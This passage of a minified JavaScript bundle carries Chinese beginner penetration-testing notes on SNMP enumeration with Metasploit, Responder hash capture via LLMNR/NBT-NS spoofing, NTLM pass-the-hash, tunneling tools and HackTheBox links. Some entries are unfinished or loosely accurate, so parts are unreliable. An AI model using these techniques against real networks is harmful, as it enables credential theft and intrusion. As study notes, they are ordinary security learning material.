      https://www.leavesongs.com/content/files/slides/CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E6%98%AF%E8%BE%93%EF%BC%9F%E4%BD%A0%E8%BF%98%E5%B7%AE%E7%82%B9Tricks%21.pdf
          \u7591\u4F3C\uFF0C\u662F\u7528\u300Aslides\u6846\u67B6\u300B\u5236\u4F5C\u7684\uFF1F\uFF1F

  CTF\uFF0C\u7EC3\u4E60\u7AD9\u70B9\uFF1A
      https://pwnhub.cn/

      \u3010CTFshow\u3011\uFF0C\u2014\u2014\u840C\u65B0\u5165\u95E8\u7684\u597D\u5730\u65B9
          https://ctf.show/

  `]))),Object(u.a)(Uj||(Uj=Object(h.a)([`
  \u3010\u533A\u5757\u94FE\u3011\u3001\u3010BlockChain\u3011
  \u3010\u6570\u5B57\u8D27\u5E01\u3011

  `,`

  `])),Cj),Object(u.a)(Kj||(Kj=Object(h.a)([`
  \u3010APP\u3011\u3001\u3010Apk\u3011\u3001
  \u3010Android\u3011\u3001\u3010\u5B89\u5353\u3011
  \u3010iOS\u3011\u3001\u3010Apple\u3011\u3001\u3010\u82F9\u679C\u3011

  \u3010UniDbg\u3011\u3001\u3010Frida\u3011

  `,`

  `])),Ej),Object(u.a)(qj||(qj=Object(h.a)([`
  \u3010\u6EAF\u6E90\u3011

  \u5927\u90E8\u5206\u5185\u5BB9\uFF0C\u548C\u300A\u4FE1\u606F\u6536\u96C6\u300B\u662F\u6709\u91CD\u53E0\u7684


  `,`

  `])),kn),Object(u.a)(Jj||(Jj=Object(h.a)([`

  \u3010SNMP\u3011\u3001\u3010161\u3011\u3001\u3010162\u3011

  \u4ECB\u7ECD\uFF1A
      \u7F51\u7EDC\u7BA1\u7406\u534F\u5B9A

      Simple Network Management Protocol\uFF0C\u7B80\u5355\u7F51\u7EDC\u7BA1\u7406\u534F\u8BAE

  \u4F7F\u7528\u65B9\u5F0F\uFF1A
      snmpwalk -c public IP\u5730\u5740 \uFF08\u8FD0\u884C\u4E0D\u8D77\u6765\uFF0C\u6682\u65F6\u6CA1\u641E\u61C2\u600E\u4E48\u7528\u7684\uFF09

      metasploit
          \u3010use auxiliary/scanner/snmp/snmp_enum\u3011\u2014\u2014\u3010set rhosts \u76EE\u6807IP\u5730\u5740\u3011\u2014\u2014\u3010run\u3011
              \u5C1D\u8BD5\u83B7\u5F97\uFF0C\u7528\u6237\u8D26\u6237\u540D
          \u3010use auxiliary/scanner/snmp/snmp_enumusers\u3011\u2014\u2014\u3010set rhosts \u76EE\u6807IP\u5730\u5740\u3011\u2014\u2014\u3010run\u3011
              \u5C1D\u8BD5\u83B7\u5F97\uFF0C\u66F4\u591A\u7684\u7528\u6237\u8D26\u6237\u540D

  `]))),Object(u.a)(Vj||(Vj=Object(h.a)([`
  \u3010ARP\u3011

  \u4ECB\u7ECD\uFF1A
      \u5730\u5740\u89E3\u6790\u534F\u8BAE\u3002  Address Resolve Protocol\u3002

      \u5E38\u7528\u4F5C\u3010\u5185\u7F51\u8BEF\u5BFC\u3011

  \u6B65\u9AA4\uFF1A
      123


  `]))),Object(u.a)(Gj||(Gj=Object(h.a)([`
  \u3010Syslog\u3011\u3001\u3010514\u3011

  \u4ECB\u7ECD\uFF1A
      System Log\uFF0C\u7CFB\u7EDF\u65E5\u5FD7\u3002
      \u4E00\u79CD\u534F\u8BAE\uFF0C\u7528\u4E8E\u53D1\u9001\uFF1A
          \u7528\u4E8E\u628A\u7CFB\u7EDF\u65E5\u5FD7\u53D1\u9001\u5230\u8FDC\u7A0B\u4E3B\u673A\u4E0A\u3002

  `]))),Object(u.a)(Qj||(Qj=Object(h.a)([`
  \u3010IPC\u3011

  \u4ECB\u7ECD\uFF1A
      \u8FDB\u7A0B\u95F4\u901A\u8BAF \uFF08Inter-Process Communication\uFF09\u3002


  `]))),Object(u.a)(Xj||(Xj=Object(h.a)([`
  \u3010wmi\u3011\u3001\u3010wmic\u3011

  \u4ECB\u7ECD\uFF1A
      WMI\uFF0C\u539F\u6307\u3010Windows\u7BA1\u7406\u89C4\u8303\u3011\uFF0C\u53C8\u79F0\u4E3A\u3010Windows\u7CFB\u7EDF\u63D2\u4EF6\u3011\u3002
      Windows Management Instrumentation\uFF0CWindows\u7BA1\u7406\u5DE5\u5177\u3002

  \u76F8\u5173\u547D\u4EE4\uFF1A
      wmiexec

  `]))),Object(u.a)(Yj||(Yj=Object(h.a)([`
  \u3010mqtt\u3011

  `,`

  `])),tj),Object(u.a)(Zj||(Zj=Object(h.a)([`
  \u3010\u90AE\u4EF6\u3011\u3001\u3010mail\u3011

  \u3010SMTP\u3011\u3001\u3010POP3\u3011\u3001\u3010IMAP4\u3011

  \u90AE\u4EF6\u76F8\u5173\u7684\u534F\u8BAE\u3002
      SMTP
          \u7AEF\u53E325
      POP3
          \u7AEF\u53E3110
      IMAP
          \u7AEF\u53E3143

  `]))),Object(u.a)($j||($j=Object(h.a)([`
  \u3010\u96A7\u9053\u3011\u3001\u3010tunnel\u3011\u3001\u3010\u96A7\u9053\u8F6C\u53D1\u3011
  \u3010\u5185\u7F51\u4EE3\u7406\u3011\u3001\u3010\u5185\u7F51\u7A7F\u900F\u3011\u3001\u3010\u5185\u7F51\u6E17\u900F\u3011\u3001\u3010FRP\u3011

  \u63D0\u5230\u7684\u4E00\u4E9B\u5DE5\u5177
      Neo-reGeorg

  \u8FD9\u5757\uFF0C\u6211\u76EE\u524D\u8FD8\u4E0D\u662F\u5F88\u6E05\u695A\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026
      \u96A7\u9053\u8F6C\u53D1
          \u7ED9\u5230\u7684\u4E00\u4E9B\u5DE5\u5177
              2\u3001http\u811A\u672C
                  reGeorg
                  tunna
                  woo...
                  wevely....
              4\u3001RDP\u96A7\u9053\u8F6C\u53D1
                  SocksOverRDP
              6\u3001\u6B63\u53CD\u5411TCP\u7AEF\u53E3\u8F6C\u53D1
                  nginx
                  netsh
                      \uFF08\u9632\u706B\u5899\u4E4B\u7C7B\u7684\uFF0C\u76F8\u5173\u7684\uFF09
                  socat
                  ew
                      \u4E0D\u514D\u6740



  `]))),Object(u.a)(ue||(ue=Object(h.a)([`
  \u3010Redis\u3011\u3001\u30106379\u3011\u3001

  `,`

  `])),hj),Object(u.a)(ne||(ne=Object(h.a)([`
  \u3010NTLM\u3011\u3001
  \u3010PTH\u3011\u3001

  \u548C\u300AMimikatz\u300B\u3001\u300AKerberos\u300B\u3001\u300A\u9EC4\u91D1\u7968\u636E\u300B\u3001\u300A\u767D\u94F6\u7968\u636E\u300B\u6709\u5173

  \u7B80\u4ECB\uFF1A
      \u662F NT Lan Manager \u7684\u7F29\u5199\u3002
      NTLM \u662F\u6307telnet \u7684\u4E00\u79CD\u9A8C\u8BC1\u8EAB\u4EFD\u65B9\u5F0F\uFF0C\u5373\u95EE\u8BE2/\u5E94\u7B54\u8EAB\u4EFD\u9A8C\u8BC1\u534F\u8BAE\uFF0C
          \u662FWindows NT \u65E9\u671F\u7248\u672C\u7684\u6807\u51C6\u5B89\u5168\u534F\u8BAE\uFF0C
      Windows 2000 \u652F\u6301NTLM \u662F\u4E3A\u4E86\u4FDD\u6301\u5411\u540E\u517C\u5BB9\u3002
          Windows 2000\u5185\u7F6E\u4E09\u79CD\u57FA\u672C\u5B89\u5168\u534F\u8BAE\u4E4B\u4E00\u3002

  NTLM\u7684\u6765\u6E90\uFF1A
      \u53EF\u4EE5\u4ECE\u300AResponder\u300B\u7684\u6B3A\u9A97\u52AB\u6301\u4E2D\u5F97\u5230\u3002

  \u5728windows\u4E2D\u7684\u300A\u5E94\u7528\u573A\u666F\u300B\uFF1A
      windows\u57FA\u4E8ENTLM\u8BA4\u8BC1\u7684\u6709SMB\u3001HTTP\u3001LDAP\u3001MSSQL\u7B49\u3002
          \u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u786E\u5B9E\u4EE4\u4EBA\u9707\u60CA\uFF0C\u6709\u8FD9\u4E48\u591A\u8FD0\u7528\u7684

  NTLM\u7684\u7528\u9014\uFF1A
      \u8FD8\u539F\u51FA\u7684NTLM hash\u53EF\u7528\u4E8EPTH\u653B\u51FB


  \u300ANTLM HASH\u4E2D\u7EE7\u653B\u51FB\u300B
      \u4E00\u4E9B\u5229\u7528\u6761\u4EF6

  `]))),Object(u.a)(je||(je=Object(h.a)([`
  \u3010Responder\u3011


  \u8D44\u6599\uFF1A
      \u57FA\u672C\u539F\u7406\u548C\u5229\u7528\u624B\u6CD5\uFF1A
              \u5185\u7F51\u6E17\u900F\u4E4BResponder\u653B\u9632\uFF08\u4E0A\uFF09 - FreeBuf\u7F51\u7EDC\u5B89\u5168\u884C\u4E1A\u95E8\u6237    https://www.freebuf.com/articles/network/256844.html

      \u6E90\u7801\u5B9E\u73B0\u548C\u57FA\u4E8E\u6E90\u7801\u7684\u4FEE\u590D\u5F3A\u5316
              \u6D45\u6790\u5982\u4F55\u8BA9\u4F60\u7684Responder\u66F4\u5F3A\u5927\u4E4B\u4FEE\u590D\u7BC7 - \u817E\u8BAF\u4E91\u5F00\u53D1\u8005\u793E\u533A-\u817E\u8BAF\u4E91    https://cloud.tencent.com/developer/article/1582096

      \u4E00\u4E9B\u5355\u7EAF\u7684\u7B80\u5355\u5B9E\u9A8C\uFF1A
              https://sher10ck.com/2020/12/14/Responder-Pentest/

  \u7B80\u4ECB\uFF1A
      \u662F\u4E00\u6B3E\u6076\u610F\u653B\u51FB\u7684\u5DE5\u5177

      \u5728\u5185\u7F51\u653B\u9632\u4E2D\uFF0Cresponder\u5C31\u662F\u4E00\u4E2A\u4E0D\u5F97\u4E0D\u8BF4\u7684\u5DE5\u5177\uFF0C\u5C31\u8FDE\u201C\u653B\u51FB\u65B9\u5929\u82B1\u677F\u201D----\u5927\u540D\u9F0E\u9F0E\u7684APT\u7EC4\u7EC7\u4E5F\u6709\u4F7F\u7528\u8FC7\u8BE5\u6B3E\u5DE5\u5177\uFF0C
          \u6709\u8BC1\u636E\u8868\u660E\uFF0C\u4FC4\u7F57\u65AF\u7684APT\u7EC4\u7EC7--APT28\u66FE\u7ECF\u4F7F\u7528\u8FC7\u8FD9\u6B3E\u5DE5\u5177\u8FDB\u884CAPT\u653B\u51FB\u3002

      \u7531Laurent Gaffie\u64B0\u5199\u7684Responder\u662F\u8FC4\u4ECA\u4E3A\u6B62\uFF0C\u5728\u6BCF\u4E2A\u6E17\u900F\u6D4B\u8BD5\u4EBA\u5458\u7528\u4E8E\u7A83\u53D6\u4E0D\u540C\u5F62\u5F0F\u7684\u51ED\u8BC1\uFF08\u5305\u62ECNet-NTLM hash\uFF09\u7684\u6700\u53D7\u6B22\u8FCE\u7684\u5DE5\u5177\u3002
          \u5B83\u901A\u8FC7\u6C61\u67D3LLMNR\u548CNBT-NS\u7B49\u4E3B\u673A\u89E3\u6790\u8BF7\u6C42\uFF0C\u4ECE\u800C\u6B3A\u9A97\u76EE\u6807\u4E3B\u673A\u4E0E\u5176\u5B9E\u73B0\u7684\u6076\u610F\u670D\u52A1\u5668\u901A\u4FE1\uFF0C\u4ECE\u800C\u8FBE\u5230\u8BBE\u7F6E\u6076\u610F\u6D4F\u89C8\u5668\u4EE3\u7406\uFF0C\u7A83\u53D6\u51ED\u8BC1\u7B49\u76EE\u7684\u3002
          \u5F53\u7F51\u7EDC\u4E0A\u7684\u8BBE\u5907\u5C1D\u8BD5\u7528LLMNR\u548CNBT-NS\u8BF7\u6C42\u6765\u89E3\u6790\u76EE\u7684\u5730\u673A\u5668\u65F6\uFF0CResponder\u5C31\u4F1A\u4F2A\u88C5\u6210\u76EE\u7684\u5730\u673A\u5668\u3002
              \u5F53\u53D7\u5BB3\u8005\u673A\u5668\u5C1D\u8BD5\u767B\u9646\u653B\u51FB\u8005\u673A\u5668\uFF0Cresponder\u5C31\u53EF\u4EE5\u83B7\u53D6\u53D7\u5BB3\u8005\u673A\u5668\u7528\u6237\u7684Net-NTLM\u54C8\u5E0C\u503C\u3002


  \u672C\u8D28\u5206\u6790\uFF1A
      \u8D44\u6599\uFF1A
          \u5185\u7F51\u6E17\u900F\u4E4BResponder\u653B\u9632\uFF08\u4E0A\uFF09 - FreeBuf\u7F51\u7EDC\u5B89\u5168\u884C\u4E1A\u95E8\u6237    https://www.freebuf.com/articles/network/256844.html
                  \u63D0\u4F9B\u4E86\u3010\u539F\u7406\u3011\u768475%
          \u6D45\u6790\u5982\u4F55\u8BA9\u4F60\u7684Responder\u66F4\u5F3A\u5927\u4E4B\u4FEE\u590D\u7BC7 - \u817E\u8BAF\u4E91\u5F00\u53D1\u8005\u793E\u533A-\u817E\u8BAF\u4E91      https://cloud.tencent.com/developer/article/1582096
                  \u63D0\u4F9B\u4E86\u3010\u539F\u7406\u3011\u768425%    \u63D0\u4F9B\u4E86\u3010\u5B9E\u9A8C\u3011\u768450%
          Responder\u5728\u6E17\u900F\u6D4B\u8BD5\u4E2D\u7684\u5229\u7528 | Sriracha :)    https://sher10ck.com/2020/12/14/Responder-Pentest/
                  \u63D0\u4F9B\u4E86\u3010\u5B9E\u9A8C\u3011\u768425%

      \u672C\u8D28\uFF1A
            \u2460 \u5728\u4F7F\u7528Responder\u4E4B\u524D\uFF0C\u6211\u4EEC\u8981\u5148\u4E86\u89E3windwos\u9ED8\u8BA4\u5F00\u542F\u7684\u4E09\u79CD\u534F\u8BAE\uFF0C
                    \u8FD9\u4E09\u79CD\u534F\u8BAE\u5206\u522B\u662F\u94FE\u8DEF\u672C\u5730\u591A\u64AD\u540D\u79F0\u89E3\u6790\uFF08LLMNR\uFF09\u3001\u540D\u79F0\u670D\u52A1\u5668(NBNS) \u534F\u8BAE\u548C\u591A\u64ADDNS\uFF08mdns\uFF09\u534F\u8BAE\u3002

            \u2461 \u5728DNS\u89E3\u6790\u5931\u8D25\u540E\uFF0C\u4F1A\u9ED8\u8BA4\u8C03\u8D77\u300A\u8FD9\u4E09\u8005\u300B
                    \u4EE5\u4E0A\u51E0\u79CD\u534F\u8BAE\u5728windows\u4E2D\u90FD\u662F\u9ED8\u8BA4\u542F\u7528\u7684\uFF0C\u4E3B\u8981\u4F5C\u7528\u90FD\u662F\u5728DNS\u670D\u52A1\u5668\u89E3\u6790\u5931\u8D25\u540E\uFF0C\u5C1D\u8BD5\u5BF9windows\u4E3B\u673A\u540D\u79F0\u8FDB\u884C\u89E3\u6790\uFF0C
                            \u6B63\u56E0\u4E3A\u9ED8\u8BA4\u542F\u7528\u3001\u4E14\u5B9E\u73B0\u65B9\u5F0F\u53C8\u7C7B\u4F3C\u4E8EARP\u534F\u8BAE\uFF0C\u5E76\u6CA1\u6709\u4E00\u4E2A\u8BA4\u8BC1\u7684\u8FC7\u7A0B\uFF0C
                                    \u6240\u4EE5\u5C31\u4F1A\u5F15\u53D1\u5404\u79CD\u57FA\u4E8E\u8FD9\u4E24\u79CD\u534F\u8BAE\u7684\u6B3A\u9A97\u884C\u4E3A

            \u2462 \u6240\u4EE5\u6211\u4EEC\u7684\u300AResponder\u300B\u5C31\u662F\uFF0C\u5148\u8BF1\u9A97\u5176 DNS\u5931\u8D25 \u2014\u2014\u2014\u2014 \u81EA\u52A8\u8F6C\u5230\u8FD9\u4E09\u79CD\u534F\u8BAE \u2014\u2014\u2014\u2014 \u5192\u5145\u76F8\u5173\u670D\u52A1\u5668\uFF0C\u76F4\u63A5\u9A97\u53D6\u643A\u5E26\u7684\u51ED\u8BC1Token \uFF08\u7C7B\u4F3CCookie\u7684\u65B9\u5F0F\uFF09
                    \u800CResponder\u6B63\u662F\u901A\u8FC7\u8FD9\u79CD\u65B9\u5F0F\uFF0C\u6B3A\u9A97\u53D7\u5BB3\u673A\u5668\uFF0C\u5E76\u4F7F\u53D7\u5BB3\u673A\u5668\u5728\u540E\u7EED\u8BA4\u8BC1\u4E2D\u53D1\u9001\u5176\u51ED\u8BC1\u3002


            \u8865\u5145\u95EE\u9898\uFF1A
                    \u90A3\u5230\u5934\u6765\uFF0C\u4E3A\u4EC0\u4E48\u4F1A\u53D1\u9001\u300ANTLM V2 Hash\u300B\u5462\uFF1F
                            \u4ECB\u7ECD\uFF1A
                                    \u6839\u636E\u4E0A\u8FF0\u77E5\u8BC6\uFF0C\u6211\u4EEC\u77E5\u9053\u4E86responder\u5982\u4F55\u6B3A\u9A97\u53D7\u5BB3\u4E3B\u673A\uFF0C\u90A3\u4E48\u4E3A\u4EC0\u4E48\u53D7\u5BB3\u4E3B\u673A\u4F1A\u53D1\u9001NTLM v2 Hash\u5462\uFF1F
                                    \u8FD9\u5C31\u6D89\u53CA\u5230NTLM\u8BA4\u8BC1\u7684\u77E5\u8BC6\u4E86\uFF0C\u65E9\u671FSMB\u534F\u8BAE\u5728\u7F51\u7EDC\u4E0A\u4F20\u8F93\u660E\u6587\u53E3\u4EE4\uFF0C
                                            \u540E\u6765\u5FAE\u8F6F\u8FDB\u884C\u4E86\u6539\u8FDB\u63A8\u51FA\u4E86NTLMv1\u4F1A\u8BDD\u534F\u8BAE\uFF0C
                                                    \u7531\u4E8ENTLMv1\u4E5F\u5F88\u8106\u5F31\uFF0C\u6240\u4EE5\u540E\u6765\u5C31\u6709\u4E86NTLM v2\u4EE5\u53CAKerberos\u9A8C\u8BC1\u4F53\u7CFB\uFF0C
                                                            \u76EE\u524Dwinserver 2008\u53CA\u4EE5\u540E\u7684windows\u7248\u672C\u9ED8\u8BA4\u5747\u662F\u4F7F\u7528NetNTLMv2\u7684\uFF0C
                                                                    \u9ED8\u8BA4\u4F7F\u7528NTLMv1\u7684\u67092003\u3001XP\u8FD9\u4E9B\u673A\u5668\u3002

                                    windows\u57FA\u4E8ENTLM\u8BA4\u8BC1\u7684\u6709SMB\u3001HTTP\u3001LDAP\u3001MSSQL\u7B49\uFF0C
                                            responder\u53EF\u4EE5\u901A\u8FC7\u6A21\u62DF\u6B63\u5E38\u7684SMB\u534F\u8BAE\u4ECE\u800C\u83B7\u5F97\u53D7\u5BB3\u673A\u5668\u7684NTLMV2 hash\u503C\uFF0C
                                                    NTLM v2\u4E0D\u80FD\u76F4\u63A5\u5E94\u7528\u4E8EPass The Hash\u653B\u51FB\uFF0C\u53EA\u80FD\u901A\u8FC7\u66B4\u529B\u7834\u89E3\u6765\u83B7\u53D6\u660E\u6587\u5BC6\u7801\u3002

                                            \u800C\u653B\u51FB\u8005\u83B7\u53D6NTLMv1 hash\u540E\uFF0C\u53EF\u4EE5\u76F4\u63A5\u8FD8\u539F\u51FANTLM HASH\uFF0C\u8FD9\u6837\u7684\u8BDD\u5C31\u53EF\u4EE5\u5C06NTLM HASH\u76F4\u63A5\u7528\u4E8EPass The Hash\u653B\u51FB\uFF0C
                                                    \u76F8\u8F83\u4E8ENTLM v2\u8FD8\u9700\u8981\u7834\u89E3\u624D\u80FD\u5229\u7528\u66F4\u52A0\u4E0D\u5B89\u5168\u3002

                            \u4E00\u53E5\u8BDD\u89E3\u91CA\uFF1A
                                    Windows\u4E0B\u7684\u591A\u4E2A\u300A\u5E94\u7528\u573A\u666F\u300B\uFF0C\u90FD\u5F3A\u5236\u7528\u5230\u4E86\u300ANTLM\u300B\u8BA4\u8BC1\u3002
                                            \u5C31\u548C\u5F53\u521D\u7684\u300ALdap\u300B\u5F88\u50CF\u554A\u3002\u3002\u3002

  \u5E38\u7528\u9009\u9879\uFF1A
      \u300A-I\u300B\uFF0C\u6307\u5B9A\u7F51\u5361\u63A5\u53E3
      \u300A-A\u300B\uFF0C\u5206\u6790\u6A21\u5F0F
          \u53EF\u4EE5\u5728 \u65E0\u8FD4\u56DE \u7684\u60C5\u51B5\u4E0B\uFF0C\u770B\u5230 \u8BF7\u6C42 \u4FE1\u606F\u3002
      \u300A-b\u300B\uFF0C\u8FD4\u56DE\u4E00\u79CD\u300A\u57FA\u7840Http\u8BA4\u8BC1\u65B9\u5F0F\u300B
          \u9ED8\u8BA4\u662F NTLM \u3002
      \u300A-w\u300B\uFF0C\uFF1F\uFF1F\uFF1F
      \u300A-r\u300B\uFF0C\uFF1F\uFF1F\uFF1F
      \u300A-f\u300B\uFF0C\uFF1F\uFF1F\uFF1F
      \u300A-lm\u300B\uFF0C\u548C\u964D\u7EA7\u6709\u5173
          \u964D\u7EA7\u5230\u300AWindows XP/2003 \u6216\u66F4\u65E9\u300B

          \u52A0\u5165--lm\u53C2\u6570\u4E5F\u662F\u4E3A\u4E86\u56FA\u5B9A\u4E3A\u300A\u52A0\u5BC6\u65B9\u5F0F\u4E00\u300B
              \u5F97\u5230\u300ANTLMv1 hash\u300B
          \u4E0D\u52A0--lm\u53C2\u6570\u7684\u65F6\u5019\u5C31\u662F\u300A\u52A0\u5BC6\u65B9\u5F0F\u4E8C\u300B
              \u5F97\u51FA hash \u7684\u53EB\u300ANTLMv1-SSP Hash\u300B

  `]))),Object(u.a)(ee||(ee=Object(h.a)([`
  \u3010ActiveMQ\u3011\u3001
  \u30108161\u3011\u3001\u301061616\u3011

  ActiveMQ
      \u4ECB\u7ECD\uFF1A
          8161\u662Fmq\u81EA\u5E26\u7684\u7BA1\u7406\u540E\u53F0\u7684\u7AEF\u53E3\uFF1B61616\u662Fmq\u670D\u52A1\u9ED8\u8BA4\u7AEF\u53E3\u3002

  `]))),Object(u.a)(se||(se=Object(h.a)([`
  \u3010rtsp\u3011


  \uFF1F\uFF1F\uFF1F\uFF1F
  `])))].concat(Object(l.a)(oe()));function oe(){var sn=[Object(u.a)(fe||(fe=Object(h.a)([`
      \u3010binwalk\u3011\uFF0C\u53EF\u4EE5\u5206\u89E3\u3010Excel\u3011\u8868\u683C

      \u3010EFS\u3011
          \u8D44\u6599\uFF1A
              \u5982\u4F55\u7834\u89E3\uFF1Ahttps://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files

          \u4ECB\u7ECD\uFF1A
              Windows \u4E0A\u7684\u52A0\u5BC6\u6587\u4EF6\u7CFB\u7EDF( EFS )\u662FNTFS 3.0 \u7248\u4E2D\u5F15\u5165\u7684\u4E00\u9879\u529F\u80FD\uFF0C\u53EF\u63D0\u4F9B\u6587\u4EF6\u7CFB\u7EDF\u7EA7\u52A0\u5BC6\u3002
              \u8BE5\u6280\u672F\u4F7F\u6587\u4EF6\u80FD\u591F\u88AB\u900F\u660E\u5730\u52A0\u5BC6\uFF0C\u4EE5\u4FDD\u62A4\u673A\u5BC6\u6570\u636E\u514D\u53D7\u5BF9\u8BA1\u7B97\u673A\u8FDB\u884C\u7269\u7406\u8BBF\u95EE\u7684\u653B\u51FB\u8005\u7684\u4FB5\u5BB3\u3002
              \u89E3\u5BC6 EFS \u7684\u6838\u5FC3\u5C31\u662F\u5982\u4F55\u83B7\u53D6\u5230\u5BF9\u5E94\u7528\u6237\u7684\u8EAB\u4EFD\u51ED\u8BC1\u3002

      `]))),Object(u.a)(te||(te=Object(h.a)([`
      \u3010\u9776\u573A\u3011\u3001\u3010\u672A\u5B8C\u6210\u3011\u3001

  \u9488\u5BF9\u300AOpenAdmin\u300B\u9776\u573A\uFF0C\u975E\u5E38\u8BE6\u7EC6\u7684\u4E00\u7BC7\uFF1A
      \u4E2A\u4EBA\u611F\u89C9\uFF0C\u6C34\u5E73\u662F\u6700\u9AD8\u7684\uFF1Ahttps://ivanitlearning.wordpress.com/2020/09/24/hackthebox-openadmin/


  \u9488\u5BF9\u3010Poison\u3011\u9776\u573A\uFF1A
      poison\u653B\u51FB / \u4E2D\u6BD2\u653B\u51FB / \u65E5\u5FD7\u4E2D\u6BD2
          \u53C2\u8003\u8D44\u6599\uFF1A
              https://ivanitlearning.wordpress.com/2020/08/21/hackthebox-poison/

  `])))],mn=[Object(u.a)(ce||(ce=Object(h.a)([`
  \u3010\u7248\u672C\u3011\u3001\u3010version\u3011\u3001\u3010\u63A2\u6D4B\u3011\u3001\u3010\u4FE1\u606F\u3011

  \u8BF4\u660E\uFF0C\u5DF2\u7ECF\u601D\u8003\u4E86\u5F88\u591A\u4E86\uFF1A
  \u3010\u50F5\u5C40\u3011\u3001\u3010\u5361\u4F4F\u3011\u3001\u3010\u505A\u4E0D\u4E0B\u53BB\u3011\u3001\u3010\u6CA1\u6709\u3011\u3001\u3010\u6CA1\u6709\u6548\u679C\u3011\u3001\u3010\u6CA1\u6709\u5DE5\u4F5C\u3011\u3001\u3010\u6CA1\u6709\u6B63\u5E38\u5DE5\u4F5C\u3011\u3001\u3010\u6CA1\u6709\u663E\u793A\u3011\u3001\u3010\u601D\u8DEF\u3011\u3001\u3010\u5934\u7EEA\u3011\u3001
  \u3010\u9884\u6599\u3011\u3001\u3010\u9884\u6599\u4E4B\u5916\u3011\u3001\u3010\u610F\u6599\u3011\u3001\u3010\u610F\u6599\u4E4B\u5916\u3011\u3001
  \u3010\u65B9\u6CD5\u3011\u3001\u3010\u5E38\u7528\u3011\u3001\u3010\u975E\u5E38\u89C4\u3011\u3001\u3010\u8BE5\u8BD5\u3011\u3001\u3010\u5C1D\u8BD5\u3011\u3001\u3010\u5C1D\u8BD5\u8FC7\u3011\u3001
  \u3010\u660E\u9762\u3011\u3001\u3010\u6B7B\u8DEF\u3011\u3001\u3010\u4E00\u7B79\u83AB\u5C55\u3011\u3001\u3010\u65E0\u89E3\u3011\u3001\u3010\u632B\u8D25\u3011\u3001\u3010\u5931\u8D25\u3011\u3001\u3010\u675F\u624B\u65E0\u7B56\u3011\u3001
  \u3010\u7ECF\u9A8C\u3011\u3001\u3010\u603B\u7ED3\u3011\u3001\u3010\u79EF\u7D2F\u3011\u3001\u3010\u6709\u95EE\u9898\u3011\u3001
  \u3010\u592A\u96BE\u3011\u3001\u3010\u96BE\u3011\u3001\u3010\u505A\u4E0D\u51FA\u3011\u3001
  \u3010\u70E6\u8E81\u3011\u3001\u3010\u6211\u8BE5\u3011\u3001\u3010\u6211\u5E94\u8BE5\u3011\u3001\u3010\u600E\u4E48\u529E\u3011\u3001\u3010why\u3011\u3001\u3010\u4E0D\u5E94\u8BE5\u3011\u3001\u3010\u4E0D\u80FD\u89E3\u51B3\u3011\u3001
  \u3010\u6709\u89E3\u3011\u3001\u3010\u5E0C\u671B\u3011\u3001\u3010\u7834\u7EFD\u3011\u3001\u3010\u51FA\u8DEF\u3011\u3001
  \u3010\u5C3D\u529B\u3011\u3001\u3010\u6700\u540E\u3011\u3001\u3010\u6700\u540E\u4E00\u6B21\u3011\u3001
  \u3010\u778E\u8BD5\u3011\u3001\u3010\u778E\u649E\u3011\u3001\u3010\u778E\u3011
  \u3010\u522B\u4EBA\u3011\u3001\u3010\u95EE\u522B\u4EBA\u3011\u3001

  `,"  ",`

  \u8FD9\u91CC\uFF0C\u6709\u975E\u5E38\u9A73\u6742\u7684\u4E00\u5757\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\u5F88\u591A\u4E0D\u53EF\u9884\u671F\u7684\u95EE\u9898

  \u66FE\u7ECF\u72AF\u8FC7\u7684\u9519\u8BEF\uFF1A
      1. \u300Avsftpd 2.3.4\u300B
          \u6211\u76F4\u63A5\u5FD8\u8BB0\u4E86\u7248\u672C
              \u5176\u5B9E\uFF0C\u7F51\u4E0ACVE\u5F88\u591A
              metasploit\u4E5F\u975E\u5E38\u660E\u663E\uFF01

  `])),$u,Tu.ExploitDB_SearchSploit_MetaSploit_MSF_\u624B\u518C)];return[].concat(sn,mn)}var ie=u.g.\u63D0\u53D6\u5DE5\u5177.\u7EDF\u4E00\u8FDB\u884C\u63D0\u53D6(ke),Ee=ie.keywordsMap,ge=ie.keywords_E,he=(ae=Object(t.a)(),ae(le=(re=Nj=function sn(){Object(R.a)(this,sn)},Nj.keywordsMap=Ee,Nj.keywords_E=ge,re))||le),Fe=function(){return n.a.createElement(n.a.Fragment,null,n.a.createElement(Du.a,{cfgType:"\u81EA\u52A8\u5B57\u7B26\u4E32\u65B9\u5F0F",\u81EA\u52A8Helper_instance:he,showHeaders:!1,defaultOption_arr:[],enable\u62FC\u97F3\u641C\u7D22:sj.d.\u6E17\u900F\u9776\u673A_\u81EA\u52A8,additionDescription:n.a.createElement(n.a.Fragment,null,n.a.createElement("h1",null,"\u2014\u2014\u4EBA\u7684\u601D\u60F3\uFF0C\u4F18\u5148\u662F\u3010\u7CFB\u7EDF\u5316\u3011\u7684\uFF1B\u4F46\u504F\u504F\uFF0C\u6709\u4E9B\u65F6\u5019\u5C31\u662F\u3010\u53BB\u7CFB\u7EDF\u5316\u3011\u7684\u3002\u6240\u4EE5\u6709\u4E86\u6B64\u54C1"),n.a.createElement("h2",null,"\u8FD9\u4E2A\u662F\u3010\u5F00\u95E8\u94A5\u5319\u3011\uFF0C\u662F\u9002\u5408\u521D\u5B66\u8005\u7528\u7684\uFF0C\u800C\u4E0D\u662F\u7ED9\u6210\u719F\u8005\u7528\u7684\u3002 \u8BB0\u5F55\u300A\u7075\u5149\u4E00\u95EA\u300B(\u6345\u7834\u4E00\u5C42\u7A97\u6237\u7EB8)\u3001\u82E6\u5FC3\u5B64\u8BE3"),n.a.createElement("h2",null,"\u53EF\u4EE5\u4F5C\u4E3A\u4E00\u4E2A\u3010\u7D22\u5F15\u3011\uFF0C\u4E32\u8054\u3001\u67E5\u627E\u3010Web\u9879\u76EE\u3011\u4E2D\u6240\u6709\u7684\u5185\u5BB9\uFF1B\u5E76\u4E14\u6765\u4EE3\u66FF\u3010\u91D1\u5C71\u6587\u6863\u3011\u7684\u3010\u8868\u683C\u7D22\u5F15\u3011\u3002"),n.a.createElement("h2",null,"\u4F46\u662F\uFF0C\u5BF9\u4E8E\u3010\u6E17\u900F\u3011\uFF0C\u521D\u5B66\u8005\u548C\u6210\u719F\u8005\uFF0C\u90FD\u9002\u7528\u8FD9\u4E00\u5957\u4F53\u7CFB\u3002 